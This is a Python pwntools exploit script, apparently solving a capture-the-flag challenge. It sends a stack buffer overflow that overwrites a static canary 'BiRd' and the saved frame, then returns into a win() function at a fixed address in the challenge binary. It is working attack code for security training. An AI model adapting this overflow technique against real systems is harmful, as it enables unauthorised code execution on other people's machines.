#!/usr/bin/env python3

import argparse
from pwn import *

def main():
  # Parse command-line arguments
  parser = argparse.ArgumentParser(description="Exploit script using Pwntools")
  parser.add_argument(
    "host", type=str,
    help="The hostname or IP address to connect to",
  )
  parser.add_argument(
    "port", type=int,
    help="The port number of the service to connect to",
  )
  args = parser.parse_args()
  
  # Define payload components
  buffer_size = 64
  
  # Use Pwntools' p32 for packing integers in little-endian format
  vuln_return_address = p32(0x08049336)

  # Length to be sent to the program
  length = f"{buffer_size + 4 + 4 + 4 + 4}".encode()
  length += b'\n'
  
  # Construct the payload
  payload = b'A' * buffer_size      # Fill the buffer
  payload += b'BiRd'                # Canary
  payload += b'B' * 4               # Overwrite saved EBP
  payload += vuln_return_address    # Address *to jump* to win()
  payload += b'0' * 4               # Return address *for* win() function
  payload += b'\n'                  # Newline to indicate end of payload
  
  # Establish a remote connection using Pwntools
  try:
    with remote(args.host, args.port) as connection:
      # Receive initial banner or prompt from the server
      initial_response = connection.recvuntil(b"> ")
      print(initial_response.decode('utf-8'))
      # Send the length
      connection.send(length)
      
      intermediate_response = connection.recvuntil(b"> ")
      print(intermediate_response.decode('utf-8'))
      # Send payload
      connection.send(payload)

      final_response = connection.recvall(timeout=5)
  except Exception as e:
    print(f"An error occurred: {e}")

if __name__ == "__main__":
  main()

